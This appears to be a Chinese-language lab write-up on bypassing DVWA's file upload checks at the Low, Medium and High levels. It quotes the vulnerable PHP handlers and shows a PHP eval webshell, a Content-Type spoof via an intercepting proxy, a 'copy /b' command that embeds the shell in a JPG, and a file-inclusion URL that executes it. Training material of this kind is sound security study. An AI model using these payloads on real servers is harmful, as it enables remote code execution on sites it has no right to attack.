---
layout: post
title: "DVWA File Upload"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_File_Upload
author: ""
tags: ['DVWA', 'File_Upload']
---



# DVWA File Upload

###### tags: `DVWA`



# Low


沒過濾

```php=

<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>

```


直接上傳 PHP 一句話，成功。

他還給出了路徑:

```
../../hackable/uploads/hack.php succesfully uploaded!


http://localhost/vulnerabilities/upload/../../hackable/uploads/hack.php 

```
antsword 可以連一下一句話。




# Medium 


code:




```php=


<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>



重點:
* 判斷了 content type:
```
```php=

if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) )

```


我們一樣用PHP 一句話
bp抓一下:

```http=

POST /vulnerabilities/upload/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=-----233962787037092799402744875259--



```

此時可以看到 hack2.jpg 可以看到content type 改了。

接下來改回php檔 filename="hack2.php"

效果一樣。



<br/><br/>




# High

code:

$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
已逗點分開來獲取複檔名

並且接下來判端 是否是圖片的複檔名。

假如你一句話存 jpg檔 他還用 getimagesize 函數去讀取資料內容是否為圖片格式。

```php=
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```


所以這時候我們只能配合其他漏洞了。因為我們一定要上傳一個圖片檔。


先用小畫家 產生一個hack3.jpg
再把一句話 hack.php 綑綁在一起。
產生hack4.jpg

打開CMD:

```
copy hack3.jpg/b+ hack.php hack4.jpg
```

notepade 打開hack4.jpg 檢查一下有沒出現你的一句話
```
?php @eval($_POST[x]); ?>
```


有的話上傳。

此時訪問到hack4.jpg 也是沒用的，因為php認為把他當圖片解析。

搭配 file inclusion level:high漏洞，他會把內容自動解析成php檔。

```
http://localhost/vulnerabilities/fi/?page=file:///C:/Users/liar/Desktop/DVWA-master/hackable/uploads/hack4.jpg
```

蟻劍成功連上。





# Impossible:

他這裡寫太複雜，有空研究。但是很安全。








